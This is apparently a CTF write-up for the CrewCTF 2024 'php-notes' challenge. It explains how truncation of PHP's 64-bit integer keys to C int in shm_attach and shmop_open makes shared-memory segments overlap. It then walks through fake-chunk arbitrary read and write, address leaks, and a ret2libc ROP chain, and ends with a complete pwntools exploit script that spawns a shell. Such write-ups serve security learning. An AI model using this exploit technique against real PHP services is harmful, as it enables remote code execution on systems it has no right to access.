---
title: 'CrewCTF 2024'
challenge: 'php-notes'
date: 2024-08-07T00:00:00+01:00
author: 'v0lp3'
description: 'Writeup for the CrewCTF 2024 challenge "php-notes"' 
cover: '/img/crew_ctf_2024/logo.png'
tags: ['pwn', 'php', 'internals', 'rop']
draft: false
---

## Challenge description

> Just a basic note storage service... written in PHP!

## Overview

This is a write-up for the 'php-notes' challenge from CrewCTF 2024. This challenge involves exploiting PHP internals, where the vulnerability is primarily caused by a type misalignment between the *int* type in PHP and the *int* type in C.

The challenge includes the source code of the PHP note storage in the file *chall.php*:

{{< code language="php" title="chall.php" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
<?php

class Zaj {
    const ERR_NO_NOTEPAD = "notepad not initialized";
    const ERR_NO_MEMO = "memo not initailized";
    const ERR_BAD_VAL = "bad value";
    const ERR_NO_NOTE = "no such note";
    const ERR_EXISTS = "already exists";
    const ERR_MEMORY = "memory error";

    static $notepad, $notepad_key;
    static $memo, $memo_key;
    static $session_key;

    static function main() {
        self::$session_key = random_int(0, 2**32 - 1);

        try {
            while(1) {
                self::vuln();
            }
        } catch(Exception $e) {
            printf("Error: %s!\n", $e->getMessage());
        }
    }

    static function choice() {
        self::puts("1. Open notepad");
        
        self::puts("2. Add note");
        self::puts("3. Edit note");
        self::puts("4. View note");
        self::puts("5. Delete note");

        self::puts("6. Add memo");
        self::puts("7. Edit memo");
        self::puts("8. View memo");
        self::puts("9. Delete memo");
    
        return self::read_int("> ");
    }

    static function vuln() {
        switch(self::choice()) {
            // Open notepad
            case 1:
                self::$notepad && throw new Exception(self::ERR_EXISTS);

                self::$notepad_key = self::id_to_key(self::read_int("Notepad id: "));
                if(self::$notepad_key === 0 || self::$notepad_key === self::$memo_key) {
                    throw new Exception(self::ERR_BAD_VAL);
                }

                $notepad_size = self::read_int("Size: ");
                if($notepad_size <= 0x100 || $notepad_size > 0x100000) {
                    throw new Exception(self::ERR_BAD_VAL);
                }

                self::$notepad = shm_attach(self::$notepad_key, $notepad_size);
                if(!self::$notepad) {
                    throw new Exception(self::ERR_MEMORY);
                }
                break;

            // Add/Edit note
            case 2:
            case 3:
                self::$notepad || throw new Exception(self::ERR_NO_NOTEPAD);
                
                $note_id = self::read_int("Note id: ");
                $note_contents = self::read_string("Note contents: ");

                if(!shm_put_var(self::$notepad, $note_id, $note_contents)) {
                    throw new Exception(self::ERR_MEMORY);
                }
                break;

            // View note
            case 4:
                self::$notepad || throw new Exception(self::ERR_NO_NOTEPAD);
                
                $note_id = self::read_int("Note id: ");
                if(shm_has_var(self::$notepad, $note_id)) {
                    self::puts(shm_get_var(self::$notepad, $note_id));
                } else {
                    throw new Exception(self::ERR_NO_NOTE);
                }
                break;

            // Delete note
            case 5:
                self::$notepad || throw new Exception(self::ERR_NO_NOTEPAD);
                
                $note_id = self::read_int("Note id: ");
                if(shm_has_var(self::$notepad, $note_id)) {
                    shm_remove_var(self::$notepad, $note_id);
                } else {
                    throw new Exception(self::ERR_NO_NOTE);
                }
                break;

            // Add memo
            case 6:
                self::$memo && throw new Exception(self::ERR_EXISTS);

                self::$memo_key = self::id_to_key(self::read_int("Memo id: "));
                if(self::$memo_key === 0 || self::$memo_key === self::$notepad_key) {
                    throw new Exception(self::ERR_BAD_VAL);
                }

                $memo_size = self::read_int("Size: ");
                if($memo_size <= 0 || $memo_size > 0x100) {
                    throw new Exception(self::ERR_BAD_VAL);
                }

                self::$memo = shmop_open(self::$memo_key, "c", 0666, $memo_size);
                if (!self::$memo) {
                    throw new Exception(self::ERR_MEMORY);
                }
                break;
            
            // Edit memo
            case 7:
                self::$memo || throw new Exception(self::ERR_NO_MEMO);
                $memo_contents = self::read_string("Memo contents: ");
                shmop_write(self::$memo, $memo_contents, 0);
                break;

            // View memo
            case 8:
                self::$memo || throw new Exception(self::ERR_NO_MEMO);
                self::puts(shmop_read(self::$memo, 0, 0));
                break;

            // Delete memo
            case 9:
                self::$memo || throw new Exception(self::ERR_NO_MEMO);
                shmop_delete(self::$memo);
                self::$memo = self::$memo_key = NULL;
                break;
                
            #zif_phpversion
            case 10:
                self::puts(phpversion());
                break;
            
            default:
                exit();
                break;
        }
    }

    static function id_to_key($id) {
        return $id ^ self::$session_key;
    }

    static function read_string($prompt) {
        print($prompt);
        return substr(fgets(STDIN), 0, -1);
    }

    static function read_int($prompt) {
        return (int) self::read_string($prompt);
    }

    static function puts($str) {
        print($str . "\n");
    }
}

Zaj::main();
{{< /code >}}

Basically, we can create two types of 'object': *notepad* and *memo*, both of which are allocated in the [shared memory](https://en.wikipedia.org/wiki/Shared_memory):

- *Notepad* contains *notes* and is structured like a dict (key:value), allowing us to create more than one note. The object is allocated by the `shm_attach` function, and the notes are retrieved/inserted by `shm_get_var`/`shm_put_var` methods.

- *Memo* contains only one string. The object is allocated by the `shmop_open` function and is handled using the `shmop_write` / `shmop_read` methods.

Note that three check occur in the notepad allocation (similar for memo allocation):

{{< code language="php" title="chall.php" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
// ...

    static function main() {
        self::$session_key = random_int(0, 2**32 - 1);
// ...    
    }

    static function vuln() {
        switch(self::choice()) {
            // Open notepad
            case 1:
                self::$notepad && throw new Exception(self::ERR_EXISTS);

                self::$notepad_key = self::id_to_key(self::read_int("Notepad id: "));
                if(self::$notepad_key === 0 || self::$notepad_key === self::$memo_key) {
                    throw new Exception(self::ERR_BAD_VAL);
                }
// ...
{{< /code >}}

- The `notepad` can be allocated only once.
- The `notepad_key` must be different from the `memo_key` to avoid overlapping.
- The `notepad_key` must be different from zero to avoid the use of the [special value](https://github.com/torvalds/linux/blob/d4560686726f7a357922f300fc81f5964be8df04/include/uapi/linux/ipc.h#L7) `IPC_PRIVATE`. However, we can provide the `IPC_PRIVATE` key if we know the value of `session_key`, but that value is random.

Additionally, we can get the version of the running php from `phpversion()` if we enter *10*, which returns `8.1.2-1ubuntu2.18`.

However, the challenge involves the usual operations: creation, modification, and deletion. I assume the reader has skimmed through the source code of the challenge to better follow this write-up.

## The vulnerability

The vulnerability is subtle and lies in a missalign between *int* type in PHP and *int* type in C.
Digging into the protoype of the PHP function used for notepad, we have:

{{< code language="php" title="shm_attach prototype" id="3" expand="Show" collapse="Hide" isCollapsed="false" >}}
shm_attach(int $key, ?int $size = null, int $permissions = 0666): SysvSharedMemory|false
{{< /code >}}

The function is defined as follows, where shm_key is handled as a `zend_long` [which is a typedef for the type](https://github.com/php/php-src/blob/PHP-8.1.2/Zend/zend_long.h#L32) `int64_t`:

{{< code language="c" title="PHP-8.1.2/ext/sysvshm/sysvshm.c" id="4" expand="Show" collapse="Hide" isCollapsed="false" >}}
PHP_FUNCTION(shm_attach)
{
    // ...
    zend_long shm_key, shm_id, shm_size, shm_flag = 0666;
    //...

	/* get the id from a specified key or create new shared memory */
	if ((shm_id = shmget(shm_key, 0, 0)) < 0) {
		if (shm_size < (zend_long)sizeof(sysvshm_chunk_head)) {
	
    //...
		
        }
	}
{{< /code >}}


Now, looking up the prototype of `shmget` function, we find that the first argument has type `key_t`, which [is a typedef](https://github.com/torvalds/linux/blob/d4560686726f7a357922f300fc81f5964be8df04/include/linux/types.h#L29) of `__kernel_key_t`. The latter is [a typedef](https://github.com/torvalds/linux/blob/master/include/uapi/linux/posix_types.h#L33) of `int`! This causes an integer overflow for choosen input, because `zend_long` will be truncated when passed to `shmget`.

Another consideration is that both functions used to open the shared segment will attach to an existing segment if an existing key is provided. By exploiting the integer overflow bug, we can cause this behavior.

### Shaping of the memory mapping

Analyzing the virtual memory mapping after the notepad and memo allocations, we note that there are three situations we can encounter, influenced by the size of our allocations.

For the allocations, I will use the ids *8589934591* and *4294967295*, which are respectively `2**32 + 2**31 - 1` and `2**32 - 1`.

**Case 1**:

- 1. Allocation of memo (256 bytes)
- 2. Allocation of notepad (3600 bytes)

{{< code language="c" title="Memory mapping 1" id="5" expand="Show" collapse="Hide" isCollapsed="false" >}}
0x7f18ece00000     0x7f18ece01000 rw-p     1000  e5000 /usr/lib/x86_64-linux-gnu/libm.so.6
0x7f18ece02000     0x7f18ece03000 rw-p     1000      0 /SYSV763f8639 (deleted)
0x7f18ece03000     0x7f18ece05000 rw-p     2000      0 [anon_7f18ece03]
0x7f18ece05000     0x7f18ece07000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x7f18ece07000     0x7f18ece31000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x7f18ece31000     0x7f18ece3c000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x7f18ece3c000     0x7f18ece3d000 rw-p     1000      0 /SYSV763f8639 (deleted)
0x7f18ece3d000     0x7f18ece3f000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x7f18ece3f000     0x7f18ece41000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
{{< /code >}}

We have control on the first `SYSV763f8639`.

**Case 2**:

- 1. Allocation of notepad (0x1337 bytes)
- 2. Allocation of memo (256 bytes)

{{< code language="c" title="Memory mapping 2" id="6" expand="Show" collapse="Hide" isCollapsed="false" >}}
0x7f41988fd000     0x7f41988ff000 rw-p     2000      0 /SYSVbf606d17 (deleted)
// ...
0x7f419b5be000     0x7f419b5e6000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7f419b5e6000     0x7f419b77b000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7f419b77b000     0x7f419b7d3000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7f419b7d3000     0x7f419b7d4000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7f419b7d4000     0x7f419b7d8000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7f419b7d8000     0x7f419b7da000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
// ...
0x7f419c0af000     0x7f419c0b1000 rw-p     2000      0 /SYSVbf606d17 (deleted)
0x7f419c0b1000     0x7f419c0b3000 rw-p     2000      0 [anon_7f419c0b1]
0x7f419c0b3000     0x7f419c0b5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x7f419c0b5000     0x7f419c0df000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x7f419c0df000     0x7f419c0ea000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x7f419c0eb000     0x7f419c0ed000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x7f419c0ed000     0x7f419c0ef000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
{{< /code >}}

We have control on the second `SYSVbf606d17`.

**Case 3**:

- 1. Allocation of notepad (1048576 bytes)
- 2. Allocation of memo (256 bytes)

{{< code language="c" title="Memory mapping 3" id="7" expand="Show" collapse="Hide" isCollapsed="false" >}}
0x556b33eab000     0x556b34078000 rw-p   1cd000      0 [heap]
0x7f7e80b46000     0x7f7e80bc7000 rw-p    81000      0 [anon_7f7e80b46]
0x7f7e80bd0000     0x7f7e80be0000 rw-p    10000      0 /SYSVfc248944 (deleted)
0x7f7e80be0000     0x7f7e80bf0000 rw-p    10000      0 /SYSVfc248944 (deleted)
0x7f7e80bf0000     0x7f7e80bf2000 r--p     2000      0 /usr/lib/php/20210902/tokenizer.so
0x7f7e80bf2000     0x7f7e80bf6000 r-xp     4000   2000 /usr/lib/php/20210902/tokenizer.so
{{< /code >}}

Cases 1 and 2 are favorable for the exploitation technique presented in this post because the *ld segment* is at a static distance. Case 3 is the worst, as ASLR breaks the distance, and we don't get leaks.

### Overlapping regions

After we trigger the bug in the allocation, we get two overlapping shared memory segments that are mapped at different addresses. We can confirm this by viewing the memo. The result will be something similar to:

{{< code language="shell" title="Memo view: notepad segment" id="8" expand="Show" collapse="Hide" isCollapsed="false" >}}
> $ 8
PHP_SM\x00\x00(\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\xd8\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
{{< /code >}}

This corresponds to the structures [sysvshm_chunk_head](https://github.com/php/php-src/blob/master/ext/sysvshm/php_sysvshm.h#L49) and [sysvshm_chunk](https://github.com/php/php-src/blob/master/ext/sysvshm/php_sysvshm.h#L42):

{{< code language="c" title="PHP-8.1.2/ext/sysvshm/php_sysvshm.h" id="9" expand="Show" collapse="Hide" isCollapsed="false" >}}
// ...

typedef struct {
	char magic[8];
	zend_long start;
	zend_long end;
	zend_long free;
	zend_long total;
} sysvshm_chunk_head;

// ...

typedef struct {
	zend_long key;
	zend_long length;
	zend_long next;
	char mem;
} sysvshm_chunk;

// ...

{{< /code >}}

We can parse the structure with the following python code:

{{< code language="python" title="Python class to parse structures" id="10" expand="Show" collapse="Hide" isCollapsed="false" >}}
from pwn import *

class ShmChunk:
    def __init__(self, key, length, next, content):
        self.key = key
        self.length = length
        self.next = next
        self.content = content

    def get(self):
        return flat(p64(self.key), p64(self.length), p64(self.next), self.content)

    def get_mem(self, data):
        return data[: self.length]

    def __repr__(self) -> str:
        return f"""struct sysvshm_chunk {{
\tzend_long key = {self.key};
\tzend_long length = {self.length};
\tzend_long next = {self.next};
\tzend_long mem = {chr(self.content[0])};
}};

Content: {self.content}
"""


class ShmObject:
    def __init__(self, magic, start, end, free, total, data):
        self.magic = magic
        self.start = start
        self.end = end
        self.free = free
        self.total = total
        self.data = data

    def get(self):
        return flat(
            self.magic, p64(self.start), p64(self.end), p64(self.free), p64(self.total)
        )

    def __repr__(self) -> str:
        return f"""struct sysvshm_chunk_head {{
\tchar magic[8] = {self.magic};
\tzend_long start = {self.start};
\tzend_long end = {self.end};
\tzend_long free = {self.free};
\tzend_long total = {self.total};
}};"""

    def search_key(self, key):
        # Search for the key

        pos = self.start

        while True:
            if pos >= self.end:
                return None

            chunk_key = u64(self.data[pos : pos + 8])
            length = u64(self.data[pos + 8 : pos + 16])
            next = u64(self.data[pos + 16 : pos + 24])
            mem = self.data[pos + 24]

            chunk = ShmChunk(
                chunk_key, length, next, self.data[pos + 24 : pos + 24 + length]
            )

            if chunk.key == key:
                return chunk

            pos += chunk.next

            if chunk.next == 0 or pos < self.start:
                return None

view_memo(r)

data = r.recvuntil(b"1.", drop=True)

shm_object = ShmObject(
    data[:8],
    u64(data[8:16]),
    u64(data[16:24]),
    u64(data[24:32]),
    u64(data[32:40]),
    data,
)
{{< /code >}}

The *sysvshm_chunk_head* structure consists of several fields: `magic`, `start`, `end`, `free`, and `total`. The *magic field* contains the fixed preamble `PHP_SM\x00\x00`. The *start field* indicates the offset from the start of the shared memory, while the *end field* indicates the offset from the end of the last chunk. The *free and total fields* are related to the occupancy of the shared memory block.

The *sysvshm_chunks* are the actual contents managed by the *sysvshm_chunk_head* and are implemented as a linked list. In this structure, the *key field* is used to search for a specific chunk. The *next field* indicates the offset from the start of the shared memory and acts as a 'pointer' to the next block. The *mem field*, a character, indicates the type of the object stored in the chunk (e.g., s for string). The actual content of the chunk is stored immediately after the mem field, and the length field determines where the block ends. The start of the content is located at `&ptr->mem` and extends to `&(ptr->mem) + ptr->length`. For example, the content of a chunk that contains a string is `s:5:"Mbare";`, where *5* represents **the length of the string**.

It's important to note that we can modify the `sysvshm_chunk_head` structure and, inherently, the `sysvshm_chunk` structures by leveraging the edit memo function.
 
## (Partial) Arbitrary read && Arbitrary Write

With the possibility to fake the`sysvshm_chunk_head` and `sysvshm_chunk` objects, we can achieve partial arbitrary read (only forward from the notepad memory region) and full arbitrary write.

The limitation of only partial arbitrary read is caused by the fact that the code calls `shm_has_var` before `shm_get_var` in the php code. Infact [the first](https://github.com/php/php-src/blob/PHP-8.1.2/ext/sysvshm/sysvshm.c#L316) function checks that the result obtained by calling `php_check_shm_data` (the offset from the shared memory region of the notepad where the chunk was found) is positive before returning. Thus, we can't read backward from where the memory region was allocated.

{{< code language="c" title="shm_has_var" id="11" expand="Show" collapse="Hide" isCollapsed="false" >}}
PHP_FUNCTION(shm_has_var)
{
// ...
	RETURN_BOOL(php_check_shm_data(shm_list_ptr->ptr, shm_key) >= 0);
}
{{< /code >}}

If the chunk is found, the `shm_get_var` will call `php_var_unserialize` and the unserialization will end in `php_var_unserialize_internal` defined [here](https://github.com/php/php-src/blob/PHP-8.1.2/ext/standard/var_unserializer.re#L852). 

To achieve arbitrary read, we can fake the length of the string (note that the length of the string is not equal to the length of the chunk), but we must fulfill the following requirement:

{{< code language="c" title="php_var_unserialize_internal" id="12" expand="Show" collapse="Hide" isCollapsed="false" >}}
static int php_var_unserialize_internal(UNSERIALIZE_PARAMETER)
{
// ...
"s:" uiv ":" ["] 	{
	size_t len, maxlen;
	char *str;

	len = parse_uiv(start + 2);
	maxlen = max - YYCURSOR;
	if (maxlen < len) {
		*p = start + 2;
		return 0;
	}

	str = (char*)YYCURSOR;

	YYCURSOR += len;

	if (*(YYCURSOR) != '"') {
		*p = YYCURSOR;
		return 0;
	}

	if (*(YYCURSOR + 1) != ';') {
		*p = YYCURSOR + 1;
		return 0;
	}

	YYCURSOR += 2;
	*p = YYCURSOR;

	if (!var_hash) {
		/* Array or object key unserialization */
		ZVAL_STR(rval, zend_string_init_existing_interned(str, len, 0));
	} else {
		ZVAL_STRINGL_FAST(rval, str, len);
	}
	return 1;
// ...
}
{{< /code >}}

This check ensure that the parsed string will end with `";`. 
That problem can be solved with the arbitrary write leveraging because we can use it to write that stop string and achieve forward arbitrary read.

The `shm_put_var` function will end in `php_put_shm_data` (defined [here](https://github.com/php/php-src/blob/PHP-8.1.2/ext/sysvshm/sysvshm.c#L366)) which simply uses the `ptr->end` of the `sysvshm_chunk_head` to determine the position where the new chunk will be written, as shown below:

{{< code language="c" title="php_put_shm_data" id="13" expand="Show" collapse="Hide" isCollapsed="false" >}}
static int php_put_shm_data(sysvshm_chunk_head *ptr, zend_long key, const char *data, zend_long len)
{
	// ...
	shm_var = (sysvshm_chunk *) ((char *) ptr + ptr->end);
	shm_var->key = key;
	shm_var->length = len;
	shm_var->next = total_size;
	memcpy(&(shm_var->mem), data, len);
	ptr->end += total_size;
	ptr->free -= total_size;
	return 0;
}
{{< /code >}}

And here we go. We can use arbitrary write to place `";` in the last read/write segment of ld, craft a fake chunk and get all leaks we need to exploit PHP. After obtaining a leak of ld, we can calculate all other addresses as offset and inside the segment, there are even a heap and stack (environ) leaks.

### One/1000000 gadget

During my tests, one weirdness caught my attention: the phpversion() function. Debugging the execution, I found that it was called by a virtual table defined on the heap at offset *0x80238*. After I got the heap leak, I tried to overwrite that address with a one-gadget, but with no luck...

So, we can use the classic ret2libc technique to gain a shell by overwriting the saved RIP of the `zend_execute` function with the following ROP chain:

{{< code language="python" title="Rop chain" id="14" expand="Show" collapse="Hide" isCollapsed="false" >}}

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh"))
ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

chain = flat(
    p64(pop_rdi),
    p64(binsh),
    p64(ret),
    p64(libc.sym.system),
)

create_note(r, b"0", b"AA" + chain + cyclic(0x50 - len(chain) - 2))

# Trigger
r.sendlineafter(b">", b"")

{{< /code >}}

## Conclusion

I didn't solve this challenge during CrewCTF 2024 because I spotted the vulnerability too late, but I enjoyed solving it and learning more about PHP internals. I was surprised to find this misalignment issue, especially since it isn't documented in the PHP docs for *shmop_open* and *shm_attach*. I verified that this problem can occur even in *PHP 8.3.6*. It's likely considered bad practice to manually choose the key value, which is why the examples suggest using `$shm_key = ftok(__FILE__, 't');`.


Here is the commented script, downloadable [here](/scripts/crew_ctf_2024_php-notes.py):

{{< code language="python" title="Solve script" id="15" expand="Show" collapse="Hide" isCollapsed="true" >}}
from pwn import *

libc = ELF("./libc.so.6")
context.arch = "amd64"


class ShmChunk:
    def __init__(self, key, length, next, content):
        self.key = key
        self.length = length
        self.next = next
        self.content = content

    def get(self):
        return flat(p64(self.key), p64(self.length), p64(self.next), self.content)

    def get_mem(self, data):
        return data[: self.length]

    def __repr__(self) -> str:
        return f"""struct sysvshm_chunk {{
\tzend_long key = {self.key};
\tzend_long length = {self.length};
\tzend_long next = {self.next};
\tzend_long mem = {chr(self.content[0])};
}};

Content: {self.content}
"""


class ShmObject:
    def __init__(self, magic, start, end, free, total, data):
        self.magic = magic
        self.start = start
        self.end = end
        self.free = free
        self.total = total
        self.data = data

    def get(self):
        return flat(
            self.magic, p64(self.start), p64(self.end), p64(self.free), p64(self.total)
        )

    def __repr__(self) -> str:
        return f"""struct sysvshm_chunk_head {{
\tchar magic[8] = {self.magic};
\tzend_long start = {self.start};
\tzend_long end = {self.end};
\tzend_long free = {self.free};
\tzend_long total = {self.total};
}};"""

    def search_key(self, key):
        # Search for the key
        # Not very inherent for the challenge

        pos = self.start

        while True:
            if pos >= self.end:
                return None

            chunk_key = u64(self.data[pos : pos + 8])
            length = u64(self.data[pos + 8 : pos + 16])
            next = u64(self.data[pos + 16 : pos + 24])
            mem = self.data[pos + 24]

            chunk = ShmChunk(
                chunk_key, length, next, self.data[pos + 24 : pos + 24 + length]
            )

            if chunk.key == key:
                return chunk

            pos += chunk.next

            if chunk.next == 0 or pos < self.start:
                return None


def run():
    global LD_OFFSET

    if args.LOCAL:
        r = remote("leone", 1338)
        LD_OFFSET = 31
    else:
        r = remote("php-notes.chal.crewc.tf", 1337)
        LD_OFFSET = 91

    return r


def create_notepad(r):
    # we can create this only one time
    # so hardocding the values

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"id: ", b"4294967295")
    r.sendlineafter(b"Size:", b"3600")


def create_note(r, id, content):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"id: ", id)
    r.sendlineafter(b"contents:", content)


def create_memo(r, id=b"8589934591", size=b"256"):
    # overlap with the notepad
    # so hardcding the values

    r.sendlineafter(b"> ", b"6")
    r.sendlineafter(b"id: ", id)
    r.sendlineafter(b"Size: ", size)


def edit_memo(r, content):
    r.sendlineafter(b"> ", b"7")
    r.sendlineafter(b"contents: ", content)


def view_memo(r):
    r.sendlineafter(b"> ", b"8")


def view_note(r, id):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", id)


r = run()

# overlap this memo with the notepad
# because key_t is int while int in php are 64 bit
# so 2**32-1 and (2**32 + (2**32-1)) are the same

create_memo(r)

create_notepad(r)

create_note(r, b"13", b"A" * 50)

# memo and notepad are overlapping, so we can get the view of the
# serialized notepad by viewing the memo

view_memo(r)

data = r.recvuntil(b"1.", drop=True)

shm_object = ShmObject(
    data[:8],
    u64(data[8:16]),
    u64(data[16:24]),
    u64(data[24:32]),
    u64(data[32:40]),
    data,
)

log.info(shm_object)

shm_chunk = shm_object.search_key(13)

log.info(shm_chunk)

# The virtual mapping is stable so we have for each execution
###########################
# SHARED_MEMORY (notepad)
# anon_segment
# ld segments
# SHARED_MEMORY (memo, but in reality is a remapping of notepad so it have the same content)
# remaining ld segments
###########################

# The distance is fixed
# Distance is where the chunk starts
distance = 254752

# We can fake the size of the string to get partial arbitrary read
# But we need to land in address that starts with '";'
# ld segments are at fixed distance from the shared memory so we can use arbitrary write to fix this

shm_object.end = distance

# After 's:' we specify the length of the string, how many bytes read before meet '";'
shm_chunk.content = shm_chunk.content.replace(b"s:50", f"s:{distance - 30}".encode())
shm_chunk.length = 0xDEADBEEF

payload = shm_object.get() + shm_chunk.get()
log.info(f"Fake objects:\n{shm_object}\n{shm_chunk}")

edit_memo(r, payload)

stop_str = b"v0lp3_was_here"
create_note(r, b"1", stop_str)
view_note(r, b"13")
leak = r.recvuntil(stop_str)

segment_after_shm = [u64(leak[i : i + 8]) for i in range(4022, 6022, 8)]

# # After we get ld all others address can be calculated by the distance
ld_leak = segment_after_shm[LD_OFFSET] - 0x2DD6D
libc.address = ld_leak - 11489280
shm_addr = ld_leak - 12288

# environ leak
stack_leak = u64(leak[254598 : 254598 + 8])

log.info(f"ld @ 0x{ld_leak:x}")
log.info(f"libc @ 0x{libc.address:x}")
log.info(f"shmaddress @ 0x{shm_addr:x}")

ret_addr_target = stack_leak - 14680
shm_object.end = (ret_addr_target - 32) - shm_addr

log.info(f"environ @ 0x{stack_leak:x}")
log.info(f"zend_execute saved rip @ 0x{ret_addr_target:x}")

payload = shm_object.get() + shm_chunk.get()
edit_memo(r, payload)

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh"))
ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

chain = flat(
    p64(pop_rdi),
    p64(binsh),
    p64(ret),
    p64(libc.sym.system),
)

create_note(r, b"0", b"AA" + chain + cyclic(0x50 - len(chain) - 2))

# Trigger
r.sendlineafter(b">", b"")

log.success("Got shell?!")

r.interactive()
{{< /code >}}

Thanks to the organizers!

> crew{PHP_5t4nd5_f0r_Pwn_Hyp3rt3xt_Pr3pr0c3ss03r_b1f24a4d}
